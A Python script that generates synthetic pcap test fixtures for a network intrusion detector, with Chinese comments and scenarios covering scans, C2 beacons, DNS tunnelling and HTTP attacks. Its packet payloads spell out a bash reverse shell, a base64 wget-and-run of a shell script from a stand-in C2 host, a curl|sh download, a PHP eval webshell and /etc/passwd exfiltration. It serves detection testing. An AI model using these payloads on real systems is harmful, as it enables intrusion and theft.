"""生成 pcap / pcapng 测试夹具（纯标准库，无需 scapy）。

产物（与本脚本同目录）：
- traffic_scan_c2.pcap    经典 pcap：端口扫描 + 横向扫描 + C2 心跳 + 大流量外传
- traffic_dns_web.pcapng  pcapng：DNS DGA/隧道 + HTTP 注入 + TLS SNI + FTP 明文凭据
- traffic_benign.pcap     正常流量：用于验证无误报
- traffic_stream.pcap     跨报文内容：乱序/重传/POST 请求体/反向 shell/凭据对/
                          敏感文件外传/会话内 Base64，只有重组后才能看全
- traffic_http.pcap       HTTP 请求体/响应体：Webshell 命令回显、chunked 分块、
                          gzip 压缩响应、上传 .php 木马、长连接多请求、脚本下载

重新生成：  python tests/fixtures/make_pcap_fixture.py
"""
from __future__ import annotations

import os
import struct
import sys

BASE_TS = 1760000000          # 2025-10-09 左右的固定时间戳，保证夹具可复现


# ---------------- 报文构造 ----------------
def eth(ip_pkt: bytes) -> bytes:
    return (b"\x00\x11\x22\x33\x44\x55" + b"\x66\x77\x88\x99\xaa\xbb"
            + b"\x08\x00" + ip_pkt)


def ipv4(src: str, dst: str, proto: int, payload: bytes) -> bytes:
    import socket
    total = 20 + len(payload)
    hdr = struct.pack("!BBHHHBBH", 0x45, 0x00, total, 0x0000, 0x4000, 64, proto, 0)
    return hdr + socket.inet_aton(src) + socket.inet_aton(dst) + payload


def tcp(sport: int, dport: int, flags: int, payload: bytes = b"",
        seq: int = 1, ack: int = 0) -> bytes:
    return struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags,
                       65535, 0, 0) + payload


def udp(sport: int, dport: int, payload: bytes) -> bytes:
    return struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload


def dns_query(qname: str, qtype: int = 1, tid: int = 0x1234,
              rcode: int = 0, qr: int = 0) -> bytes:
    flags = (qr << 15) | (0x0100 if qr == 0 else 0x8180) | rcode
    q = b"".join(bytes([len(p)]) + p.encode() for p in qname.split(".")) + b"\x00"
    return struct.pack("!HHHHHH", tid, flags, 1, 0, 0, 0) + q + struct.pack("!HH", qtype, 1)


def client_hello(sni: str) -> bytes:
    name = sni.encode()
    entry = b"\x00" + struct.pack("!H", len(name)) + name
    sni_list = struct.pack("!H", len(entry)) + entry
    ext = struct.pack("!HH", 0x0000, len(sni_list)) + sni_list
    ext += struct.pack("!HH", 0x000A, 4) + struct.pack("!HH", 2, 0x001d)   # groups
    ciphers = struct.pack("!HH", 0xC02F, 0xC030)
    body = (struct.pack("!H", 0x0303) + b"\x11" * 32 + b"\x00"
            + struct.pack("!H", len(ciphers)) + ciphers
            + b"\x01\x00" + struct.pack("!H", len(ext)) + ext)
    hs = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16" + struct.pack("!H", 0x0301) + struct.pack("!H", len(hs)) + hs


def http_request(method: str, uri: str, host: str, ua: str) -> bytes:
    return ("%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n"
            % (method, uri, host, ua)).encode()


def http_response(status: int, clen: int) -> bytes:
    return ("HTTP/1.1 %d OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n"
            % (status, clen)).encode()


def http_req_full(method: str, uri: str, host: str, body: bytes = b"",
                  ctype: str = "application/x-www-form-urlencoded",
                  ua: str = "Mozilla/5.0") -> bytes:
    head = "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n" % (method, uri, host, ua)
    if body:
        head += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype, len(body))
    return (head + "\r\n").encode() + body


def http_resp_full(status: int, body: bytes, ctype: str = "text/html",
                   encoding: str = "", chunked: bool = False) -> bytes:
    head = "HTTP/1.1 %d OK\r\nContent-Type: %s\r\nServer: nginx\r\n" % (status, ctype)
    if chunked:
        head += "Transfer-Encoding: chunked\r\n"
    elif encoding:
        head += "Content-Encoding: %s\r\nContent-Length: %d\r\n" % (encoding, len(body))
    else:
        head += "Content-Length: %d\r\n" % len(body)
    return (head + "\r\n").encode() + body


def chunked_body(payload: bytes, parts: int = 2) -> bytes:
    """把负载切成若干 chunked 块（响应体分块传输，不解码就看不到内容）。"""
    step = max(1, len(payload) // parts)
    out = b""
    for i in range(0, len(payload), step):
        seg = payload[i:i + step]
        out += (b"%x\r\n" % len(seg)) + seg + b"\r\n"
    return out + b"0\r\n\r\n"


# ---------------- pcap 写入 ----------------
def write_pcap(path: str, packets: list) -> None:
    """packets: [(ts_float, frame_bytes)]，小端 + 微秒。"""
    with open(path, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 262144, 1))
        for ts, frame in packets:
            sec = int(ts)
            usec = int(round((ts - sec) * 1000000))
            f.write(struct.pack("<IIII", sec, usec, len(frame), len(frame)))
            f.write(frame)


def write_pcapng(path: str, packets: list) -> None:
    with open(path, "wb") as f:
        # Section Header Block
        shb_body = b"\x4d\x3c\x2b\x1a" + struct.pack("<HH", 1, 0) + struct.pack("<q", -1)
        f.write(struct.pack("<II", 0x0A0D0D0A, 12 + len(shb_body)) + shb_body
                + struct.pack("<I", 12 + len(shb_body)))
        # Interface Description Block
        idb_body = struct.pack("<HHI", 1, 0, 262144)
        f.write(struct.pack("<II", 1, 12 + len(idb_body)) + idb_body
                + struct.pack("<I", 12 + len(idb_body)))
        for ts, frame in packets:
            ts_us = int(round(ts * 1000000))
            pad = (4 - len(frame) % 4) % 4
            data = frame + b"\x00" * pad
            body = struct.pack("<IIIII", 0, ts_us >> 32, ts_us & 0xFFFFFFFF,
                               len(frame), len(frame)) + data
            f.write(struct.pack("<II", 6, 12 + len(body)) + body
                    + struct.pack("<I", 12 + len(body)))


# ---------------- 场景 ----------------
def build_scan_c2() -> list:
    """端口扫描 + 横向扫描 + C2 心跳 + 外传。"""
    pkts = []
    # 1) 端口扫描：192.168.1.10 → 10.0.0.5 的 1..30 端口
    for p in range(1, 31):
        pkts.append((BASE_TS + p * 0.01,
                     eth(ipv4("192.168.1.10", "10.0.0.5", 6, tcp(40000 + p, p, 0x02)))))
    # 2) 横向扫描：192.168.1.10 → 10.0.0.{1..25}:445
    for i in range(1, 26):
        pkts.append((BASE_TS + 5 + i * 0.01,
                     eth(ipv4("192.168.1.10", "10.0.0.%d" % i, 6, tcp(50000, 445, 0x02)))))
    # 3) C2 心跳：192.168.1.20 → 203.0.113.9:443，每 60s 一次，共 10 次
    for i in range(10):
        pkts.append((BASE_TS + 100 + i * 60,
                     eth(ipv4("192.168.1.20", "203.0.113.9", 6, tcp(51000 + i, 443, 0x02)))))
    # 4) 外传：10.0.0.30 → 203.0.113.77:443，28 × 40KB（约 1.1MB，出入比极高）
    for i in range(28):
        pkts.append((BASE_TS + 700 + i * 0.2,
                     eth(ipv4("10.0.0.30", "203.0.113.77", 6,
                              tcp(52000, 443, 0x18, b"A" * 40000)))))
    return pkts


def build_dns_web() -> list:
    """DNS DGA/隧道 + HTTP 注入 + TLS SNI + FTP 明文凭据。"""
    pkts = []
    # 1) DGA：25 次 NXDOMAIN 响应 + 对应查询
    for i in range(25):
        dom = "xq7f3k9z%02dpx.example.net" % i
        pkts.append((BASE_TS + i * 0.5,
                     eth(ipv4("10.0.0.7", "8.8.8.8", 17,
                              udp(33000 + i, 53, dns_query(dom))))))
        pkts.append((BASE_TS + i * 0.5 + 0.01,
                     eth(ipv4("8.8.8.8", "10.0.0.7", 17,
                              udp(53, 33000 + i, dns_query(dom, qr=1, rcode=3))))))
    # 2) DNS 隧道：6 次超长高熵标签查询
    for i in range(6):
        label = "9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c%02d" % i
        pkts.append((BASE_TS + 50 + i * 0.3,
                     eth(ipv4("10.0.0.7", "8.8.8.8", 17,
                              udp(34000 + i, 53, dns_query(label + ".tun.example.org"))))))
    # 3) HTTP SQL 注入（sqlmap UA）
    req = http_request("GET", "/index.php?id=1%27%20UNION%20SELECT%20password%20FROM%20users--",
                       "web.example.com", "sqlmap/1.5.2#stable")
    pkts.append((BASE_TS + 60, eth(ipv4("203.0.113.55", "10.0.0.80", 6, tcp(41000, 80, 0x18, req)))))
    pkts.append((BASE_TS + 60.1, eth(ipv4("10.0.0.80", "203.0.113.55", 6,
                                          tcp(80, 41000, 0x18, http_response(200, 2048))))))
    # 4) TLS ClientHello（SNI 指向可疑域名）
    pkts.append((BASE_TS + 61, eth(ipv4("10.0.0.7", "203.0.113.9", 6,
                                        tcp(42000, 443, 0x18, client_hello("evil-c2.example.net"))))))
    # 5) FTP 明文凭据
    pkts.append((BASE_TS + 62, eth(ipv4("10.0.0.7", "10.0.0.9", 6,
                                        tcp(43000, 21, 0x18, b"USER root\r\n")))))
    pkts.append((BASE_TS + 62.1, eth(ipv4("10.0.0.7", "10.0.0.9", 6,
                                          tcp(43000, 21, 0x18, b"PASS P@ssw0rd123\r\n")))))
    return pkts


def build_stream() -> list:
    """跨报文的应用层内容：只有做「追踪流」重组才能看全。

    场景（单包解析必然漏掉的部分）：
    1) HTTP POST 的注入载荷被切成两段且乱序到达，单包只看得到请求行
    2) 反向 shell 命令跨两段 + 服务端回显 uid=0(root)
    3) FTP 用户名与口令分属两个报文 → 配成完整凭据对
    4) 敏感文件外传（/etc/passwd 内容）
    5) 会话内 Base64 载荷 + 管道执行
    6) 同一段重复到达（重传）→ 不应被拼接两次
    7) 正常 HTTP 请求响应（验证无误报）
    """
    import base64
    pkts = []
    t = BASE_TS + 900
    PSH = 0x18

    # 1) HTTP POST：请求行与请求体分两包，且请求体先到（乱序）
    body1 = b"user=admin&pass="
    body2 = b"x%27%20UNION%20SELECT%20password%20FROM%20users--"
    full = body1 + body2
    head = ("POST /login HTTP/1.1\r\nHost: app.example.com\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "User-Agent: Mozilla/5.0\r\nContent-Length: %d\r\n\r\n" % len(full)).encode()
    c, s = ("10.0.0.30", 44000), ("10.0.0.80", 80)
    cis, sis = 1000, 5000
    pkts.append((t + 0.00, eth(ipv4(c[0], s[0], 6, tcp(c[1], s[1], 0x02, seq=cis)))))   # SYN
    pkts.append((t + 0.01, eth(ipv4(s[0], c[0], 6, tcp(s[1], c[1], 0x12, seq=sis)))))   # SYN-ACK
    pkts.append((t + 0.02, eth(ipv4(c[0], s[0], 6,
                                    tcp(c[1], s[1], PSH, head, seq=cis + 1)))))
    pkts.append((t + 0.03, eth(ipv4(c[0], s[0], 6,                     # 乱序：后一段先到
                                    tcp(c[1], s[1], PSH, body2,
                                        seq=cis + 1 + len(head) + len(body1))))))
    pkts.append((t + 0.04, eth(ipv4(c[0], s[0], 6,                     # 缺口补齐
                                    tcp(c[1], s[1], PSH, body1,
                                        seq=cis + 1 + len(head))))))
    pkts.append((t + 0.05, eth(ipv4(c[0], s[0], 6,                     # 重传：同 seq 重复
                                    tcp(c[1], s[1], PSH, body1,
                                        seq=cis + 1 + len(head))))))
    pkts.append((t + 0.06, eth(ipv4(s[0], c[0], 6,
                                    tcp(s[1], c[1], PSH, http_response(200, 512),
                                        seq=sis + 1)))))

    # 2) 反向 shell：命令跨两段（乱序），服务端回显 root 身份
    c, s = ("10.0.0.31", 45000), ("203.0.113.9", 4444)
    cis, sis = 2000, 6000
    part_a = b"bash -i >& /dev/tcp/203.0.113.9"
    part_b = b"/4444 0>&1\n"
    pkts.append((t + 0.95, eth(ipv4(c[0], s[0], 6, tcp(c[1], s[1], 0x02, seq=cis - 1)))))
    pkts.append((t + 1.00, eth(ipv4(c[0], s[0], 6, tcp(c[1], s[1], PSH, part_b,
                                                       seq=cis + len(part_a))))))
    pkts.append((t + 1.01, eth(ipv4(c[0], s[0], 6, tcp(c[1], s[1], PSH, part_a, seq=cis)))))
    pkts.append((t + 1.05, eth(ipv4(s[0], c[0], 6,
                                    tcp(s[1], c[1], PSH,
                                        b"uid=0(root) gid=0(root) groups=0(root)\n",
                                        seq=sis)))))

    # 3) FTP：用户名与口令分属两个报文
    c, s = ("10.0.0.32", 46000), ("10.0.0.9", 21)
    cis = 3000
    u, p = b"USER admin\r\n", b"PASS S3cret!2024\r\n"
    pkts.append((t + 2.00, eth(ipv4(c[0], s[0], 6, tcp(c[1], s[1], PSH, u, seq=cis)))))
    pkts.append((t + 2.01, eth(ipv4(c[0], s[0], 6, tcp(c[1], s[1], PSH, p,
                                                       seq=cis + len(u))))))

    # 4) 敏感文件外传
    c, s = ("10.0.0.33", 47000), ("203.0.113.77", 8080)
    cis, sis = 4000, 7000
    pkts.append((t + 3.00, eth(ipv4(c[0], s[0], 6, tcp(c[1], s[1], PSH,
                                                       b"cat /etc/passwd\n", seq=cis)))))
    pkts.append((t + 3.05, eth(ipv4(s[0], c[0], 6, tcp(s[1], c[1], PSH,
                                                       b"root:x:0:0:root:/root:/bin/bash\n"
                                                       b"daemon:x:1:1:daemon:/usr/sbin:/bin/sh\n",
                                                       seq=sis)))))

    # 5) 会话内 Base64 载荷 + 管道执行
    c, s = ("10.0.0.34", 48000), ("203.0.113.9", 9999)
    blob = base64.b64encode(
        b"wget http://evil-c2.example.net/shell.sh -O /tmp/shell.sh "
        b"&& chmod 755 /tmp/shell.sh").decode()
    pkts.append((t + 4.00, eth(ipv4(c[0], s[0], 6, tcp(c[1], s[1], PSH,
                                                       ("echo '%s' | base64 -d | sh\n" % blob).encode(),
                                                       seq=5000)))))

    # 6) 正常 HTTP：请求 + 响应，不应产生任何告警
    c, s = ("10.0.0.60", 49000), ("10.0.0.80", 80)
    pkts.append((t + 5.00, eth(ipv4(c[0], s[0], 6, tcp(c[1], s[1], PSH,
                                                       http_request("GET", "/index.html",
                                                                    "web.example.com",
                                                                    "Mozilla/5.0"),
                                                       seq=8000)))))
    pkts.append((t + 5.05, eth(ipv4(s[0], c[0], 6, tcp(s[1], c[1], PSH,
                                                       http_response(200, 1024),
                                                       seq=9000)))))
    return pkts


def build_http() -> list:
    """HTTP 请求体 / 响应体场景：只有重组 + 分块/压缩解码后才看得见。

    1) Webshell 交互：POST 到 uploads 下的 php，请求体 cmd=whoami，
       响应体分块返回 uid=0(root) —— 命令执行回显
    2) 敏感文件外传：响应体直接是 /etc/passwd 内容
    3) gzip 压缩响应：私钥文件（不解压就是乱码）
    4) 上传木马：multipart 里 filename="shell.php"，内容是一句话木马
    5) 长连接多请求：一条连接上 3 个请求，注入载荷只在第 3 个的请求体里
    6) 脚本下载：响应体是 curl|sh 的下载执行脚本
    7) 正常请求响应（验证无误报）
    """
    import gzip
    pkts = []
    t = BASE_TS + 1500
    PSH = 0x18
    clock = [t]

    def send(c, s, reqs=(), resps=(), syn=True):
        """按序发一条连接上的报文，自动推进序列号与时间戳。"""
        seq_c, seq_s = 1000, 9000
        if syn:
            pkts.append((clock[0], eth(ipv4(c[0], s[0], 6, tcp(c[1], s[1], 0x02, seq=seq_c - 1)))))
            pkts.append((clock[0], eth(ipv4(s[0], c[0], 6, tcp(s[1], c[1], 0x12, seq=seq_s - 1)))))
            clock[0] += 0.01
        for data in reqs:
            pkts.append((clock[0], eth(ipv4(c[0], s[0], 6,
                                            tcp(c[1], s[1], PSH, data, seq=seq_c)))))
            seq_c += len(data)
            clock[0] += 0.02
        for data in resps:
            pkts.append((clock[0], eth(ipv4(s[0], c[0], 6,
                                            tcp(s[1], c[1], PSH, data, seq=seq_s)))))
            seq_s += len(data)
            clock[0] += 0.02
        clock[0] += 1.0

    # 1) Webshell 交互 + 分块命令回显
    send(("10.0.0.40", 50000), ("10.0.0.80", 80),
         reqs=[http_req_full("POST", "/uploads/avatar.php", "web.example.com",
                             b"cmd=whoami", ua="Mozilla/5.0")],
         resps=[http_resp_full(200, chunked_body(
             b"uid=0(root) gid=0(root) groups=0(root)\n"), chunked=True)])

    # 2) 敏感文件外传
    send(("10.0.0.41", 50100), ("10.0.0.80", 80),
         reqs=[http_req_full("GET", "/download?f=/etc/passwd", "web.example.com")],
         resps=[http_resp_full(200, b"root:x:0:0:root:/root:/bin/bash\n"
                                    b"daemon:x:1:1:daemon:/usr/sbin:/bin/sh\n")])

    # 3) gzip 压缩的私钥外传
    priv = (b"-----BEGIN RSA PRIVATE KEY-----\n"
            b"MIIEowIBAAKCAQEA7x9k2mQ0fakefakefakefakefakefakefake\n"
            b"-----END RSA PRIVATE KEY-----\n")
    send(("10.0.0.42", 50200), ("10.0.0.80", 80),
         reqs=[http_req_full("GET", "/api/v1/export?type=key", "web.example.com")],
         resps=[http_resp_full(200, gzip.compress(priv), ctype="text/plain",
                               encoding="gzip")])

    # 4) 上传一句话木马
    boundary = "----WebKitFormBoundary7MA4YWxk"
    up = (("--%s\r\nContent-Disposition: form-data; name=\"file\"; "
           "filename=\"shell.php\"\r\nContent-Type: application/octet-stream\r\n\r\n"
           "<?php eval($_POST['cmd']); ?>\r\n--%s--\r\n"
           % (boundary, boundary)).encode())
    send(("203.0.113.61", 50300), ("10.0.0.80", 80),
         reqs=[http_req_full("POST", "/upload.php", "web.example.com", up,
                             ctype="multipart/form-data; boundary=" + boundary)],
         resps=[http_resp_full(200, b"{\"code\":0,\"url\":\"/uploads/shell.php\"}",
                               ctype="application/json")])

    # 5) 长连接：3 个请求复用一条连接，注入载荷只在最后一个请求体里
    send(("203.0.113.62", 50400), ("10.0.0.80", 80),
         reqs=[http_req_full("GET", "/index.html", "web.example.com"),
               http_req_full("GET", "/static/app.js", "web.example.com"),
               http_req_full("POST", "/search", "web.example.com",
                             b"q=1%27%20UNION%20SELECT%20password%20FROM%20users--")],
         resps=[http_resp_full(200, b"<html><body>home</body></html>"),
                http_resp_full(200, b"console.log(1);"),
                http_resp_full(200, b"<html>no result</html>")])

    # 6) 下载即执行脚本
    send(("10.0.0.43", 50500), ("203.0.113.88", 8080),
         reqs=[http_req_full("GET", "/tools/install.sh", "cdn.example.net")],
         resps=[http_resp_full(200,
                               b"#!/bin/bash\ncurl http://203.0.113.88/s.sh|sh\n",
                               ctype="text/plain")])

    # 7) 正常请求：不得产生任何 HTTP 内容告警
    send(("10.0.0.44", 50600), ("10.0.0.80", 80),
         reqs=[http_req_full("GET", "/", "web.example.com")],
         resps=[http_resp_full(200, b"<html><body>Welcome to example.com</body></html>")])
    return pkts


def build_benign() -> list:
    """正常流量：不应触发任何流量类告警。"""
    pkts = []
    for i in range(3):
        pkts.append((BASE_TS + i * 10,
                     eth(ipv4("10.0.0.50", "10.0.0.80", 6, tcp(40000 + i, 443, 0x02)))))
    pkts.append((BASE_TS + 1, eth(ipv4("10.0.0.50", "8.8.8.8", 17,
                                       udp(35000, 53, dns_query("example.com"))))))
    pkts.append((BASE_TS + 2, eth(ipv4("10.0.0.50", "10.0.0.80", 6,
                                       tcp(40010, 80, 0x18,
                                           http_request("GET", "/", "web.example.com",
                                                        "Mozilla/5.0"))))))
    return pkts


def main() -> int:
    here = os.path.dirname(os.path.abspath(__file__))
    write_pcap(os.path.join(here, "traffic_scan_c2.pcap"), build_scan_c2())
    write_pcapng(os.path.join(here, "traffic_dns_web.pcapng"), build_dns_web())
    write_pcap(os.path.join(here, "traffic_benign.pcap"), build_benign())
    write_pcap(os.path.join(here, "traffic_stream.pcap"), build_stream())
    write_pcap(os.path.join(here, "traffic_http.pcap"), build_http())
    for n in ("traffic_scan_c2.pcap", "traffic_dns_web.pcapng",
              "traffic_benign.pcap", "traffic_stream.pcap", "traffic_http.pcap"):
        p = os.path.join(here, n)
        print("%-26s %8d bytes" % (n, os.path.getsize(p)))
    return 0


if __name__ == "__main__":
    sys.exit(main())
